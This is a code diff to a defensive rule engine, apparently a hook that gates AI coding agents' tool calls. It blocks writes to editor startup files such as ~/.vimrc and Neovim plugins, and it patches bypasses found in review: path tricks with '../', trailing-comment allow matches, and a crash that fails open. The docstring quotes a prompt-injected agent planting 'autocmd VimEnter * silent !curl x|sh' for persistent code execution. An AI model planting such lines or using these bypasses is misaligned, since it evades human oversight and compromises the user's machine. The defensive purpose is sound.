@@ -14506,16 +14506,55 @@ def rule_http_client_config_protect(ev: Event, policy=None) -> Optional[Decision
 
 # ---- editor startup/init hijack (Vim/Neovim/Emacs/...): human-escapable -----
 def _editor_startup_allowed_by_policy(cfg: dict, text: str) -> bool:
+    """`allow` is matched against the lexically NORMALIZED path, so
+    `~/dotfiles/../.vimrc` does not satisfy an `allow: ['/dotfiles/']`
+    (QA round 2)."""
     allow = cfg.get("allow") or []
     if isinstance(allow, str):
         allow = [allow]
+    if not isinstance(text, str) or not text:
+        return False
+    norm = patterns._ed_dotdot_normalize(text.replace("\\", "/"))
+    if ".." in norm.replace("\\", "/").split("/"):
+        return False
     for pat in allow:
         try:
-            if re.search(str(pat), text, re.IGNORECASE):
+            if re.search(str(pat), norm, re.IGNORECASE):
                 return True
         except re.error:
             continue
     return False
+
+
+def _editor_startup_shell_allowed(cfg: dict, cmd: str) -> bool:
+    """Shell form: every word that names a gated path must itself satisfy
+    `allow` -- an agent appending `# /dotfiles/` to the command, or
+    mentioning an allowed path elsewhere in it, does not (QA round 2)."""
+    if not cfg.get("allow"):
+        return False
+    words = [w for w in re.findall(r"[^\s'\"<>|&;()`]+", cmd or "")
+             if patterns.editor_startup_path_hit(w)]
+    if not words:
+        return False
+    return all(_editor_startup_allowed_by_policy(cfg, w) for w in words)
+
+
+# Tool-name words that make an MCP tool a shell/process runner. Narrower
+# than the curl/wget sibling's list: `send`/`run`/`command` alone
+# (`send_email`, `actions_run_trigger`) are messaging/CI, not a shell, and
+# editor paths turn up in prose far more often (QA round 2).
+_ED_SHELL_TOOL_WORDS = frozenset((
+    "exec", "execute", "process", "terminal", "shell", "eval", "interact",
+    "repl", "spawn", "bash", "powershell", "sh", "cmd", "tmux", "console",
+    "zsh", "pwsh",
+))
+_ED_COMMAND_KEYS = ("command", "cmd", "script", "shell_command", "commandLine",
+                    "command_line")
+# Plain content keys of a write whose OWN target is set: a quoted path or
+# diff inside an ordinary file's body is not a write to that path (QA
+# round 2; the curl/wget sibling's round 5-7 rule).
+_ED_PLAIN_CONTENT_KEYS = frozenset(("content", "contents", "text", "body",
+                                    "file_content", "new_content", "file_text"))
 
 
 _ED_PATH_SHAPE_RE = re.compile(
@@ -14555,6 +14594,8 @@ def _editor_startup_mcp_target(ev: Event) -> str:
     p = _path(ev)
     if p and "\n" not in p and patterns.editor_startup_path_hit(p):
         return p
+    if p and "\n" not in p:
+        a = {k: v for k, v in a.items() if str(k) not in _ED_PLAIN_CONTENT_KEYS}
     flat = [str(x) for x in _flatten_strings(a)]
     for s_ in flat:
         if _editor_startup_path_shaped(s_):
@@ -14598,11 +14639,14 @@ def rule_editor_startup_protect(ev: Event, policy=None) -> Optional[Decision]:
     ``system()``/``:!``, Lua ``os.execute``/``vim.fn.jobstart``, Elisp
     ``shell-command``/``call-process``, Kakoune ``%sh{}``, a Helix
     ``languages.toml`` language-server ``command``) with the human's full
-    privileges, silently, on the editor's next launch -- and the editor is
+    privileges, on the editor's next launch (silently for every user-level
+    file; Neovim 0.9+ ``.nvim.lua``/exrc and Emacs ``.dir-locals.el``
+    ``eval:`` entries prompt first by default, so those two are gated as
+    defence in depth for users who have trusted/disabled the prompt) -- and the editor is
     launched not only by the human: ``git commit`` without ``-m``, ``git
-    rebase -i``, ``git tag -a``, ``crontab -e``, ``visudo``/``sudoedit``
-    (which then runs the plant as root's editor session over the user's
-    config) all spawn ``$EDITOR``. A prompt-injected agent that appends
+    rebase -i``, ``git tag -a``, ``crontab -e``, ``sudoedit`` and ``visudo``
+    all spawn ``$EDITOR`` (``visudo``/``sudo -E vim`` with ``$HOME`` kept
+    run the user's config as root). A prompt-injected agent that appends
     ``autocmd VimEnter * silent !curl x|sh`` to ``~/.vimrc``, or drops
     ``~/.config/nvim/plugin/x.lua``, gets durable code execution that
     survives the session, outlives any sandboxed run that left ``$HOME``
@@ -14621,8 +14665,9 @@ def rule_editor_startup_protect(ev: Event, policy=None) -> Optional[Decision]:
     Edit/Write/MultiEdit: the target path is matched. MCP: a shell-type
     tool (``run_command``/``start_process``/tmux ``keys``) is re-judged as a
     Bash command; a read-shaped tool (``read_file``, ``list_directory``,
-    by whole word on the tool name and with no output argument) or a pure
-    delete passes; any other call naming such a path -- under any key, as a
+    by whole word on the tool name, with no output or content argument) or
+    a tool named only with delete words plus nouns (``delete_file``) and no
+    content argument passes; any other call naming such a path -- under any key, as a
     patch header, or as a mapping key -- is gated. Shell: INVERTED, as in
     ``rule_http_client_config_protect`` -- a command naming such a path
     (literally, through ``\\`` escapes, or a glob/brace word bash would
@@ -14678,7 +14723,21 @@ def rule_editor_startup_protect(ev: Event, policy=None) -> Optional[Decision]:
     delete-shaped MCP tool names carrying content (``open_file{content}``,
     ``delete_then_recreate``); a per-command glob-candidate budget (fails
     closed); ``cd DIR && cp x nvim/init.lua``; bulk extraction into ``~``.
-    False positives fixed: ``| sort``, ``git log/diff/status/show``."""
+    False positives fixed: ``| sort``, ``git log/diff/status/show``.
+    Round 2 (design review) found false ASKs from glob expansion (``cp
+    *.el dist/`` via ``site-start.el``, ``cp -r config/* build/``, quoted
+    ``sed 's/.*/X/'``) and from unanchored ``etc/``/``share/``/``vim/``/
+    ``site-lisp`` (``docs/etc/vim``, ``build/share/vim``) -- now a bare
+    wildcard expands only to each parent's real gated children, ``.*``
+    only under a home dir, quoted text is never globbed, ``etc`` must be
+    the root's and ``share``/``lib`` must sit under an install prefix;
+    quoted paths/diffs inside an ordinary file write's ``content``; MCP
+    ``send``/``run`` messaging tools judged as shells; ``allow`` regexes
+    satisfiable by ``dotfiles/../`` or a trailing comment (now matched on
+    the normalized path, and on every gated path word of a shell
+    command); a crash (fail-open) on non-dict MCP args; a ~80 s glob bomb
+    (now a per-command budget, ~2 s, failing closed); and docstring
+    overstatements (sudoedit, prompted exrc/dir-locals)."""
     cfg = getattr(policy, "editor_startup", None) or {}
     raw_mode = cfg.get("mode", "ask")
     mode = str(raw_mode).lower()
@@ -14692,8 +14751,21 @@ def rule_editor_startup_protect(ev: Event, policy=None) -> Optional[Decision]:
             return None
         return would
 
+    if ev.args is not None and not isinstance(ev.args, dict):
+        # A non-dict arg payload must not crash the rule (a crash is
+        # fail-open in the engine -- QA round 2).
+        ev = Event.make(ev.event, tool=ev.tool, action=ev.action, cwd=ev.cwd,
+                        args={"value": ev.args})
+
     if ev.action == ActionClass.MCP:
-        shell_cmd = _http_rc_mcp_shell_command(ev)
+        a0 = ev.args or {}
+        tool_words = _http_rc_words(str(ev.tool or "").split("__")[-1])
+        shell_cmd = None
+        if tool_words & _ED_SHELL_TOOL_WORDS or any(
+                isinstance(a0.get(k), (str, list, tuple)) for k in _ED_COMMAND_KEYS) or (
+                isinstance(a0.get("args"), dict)
+                and any(k in a0["args"] for k in _ED_COMMAND_KEYS)):
+            shell_cmd = _http_rc_mcp_shell_command(ev)
         if shell_cmd is not None:
             sub = Event.make(HookEvent.PRE_TOOL_USE, tool="Bash",
                              args={"command": shell_cmd}, cwd=ev.cwd)
@@ -14728,7 +14800,7 @@ def rule_editor_startup_protect(ev: Event, policy=None) -> Optional[Decision]:
                          and patterns.editor_startup_shell_only_reads(raw)):
             return None
         if (_override_allowed(ev) or os.environ.get("AEGIS_ALLOW_EDITOR_STARTUP")
-                or _editor_startup_allowed_by_policy(cfg, raw)):
+                or (not bulk and _editor_startup_shell_allowed(cfg, raw))):
             return None
         return _finish(Decision(action, "editor-startup-protect",
                          "An editor startup/init file or runtime directory "
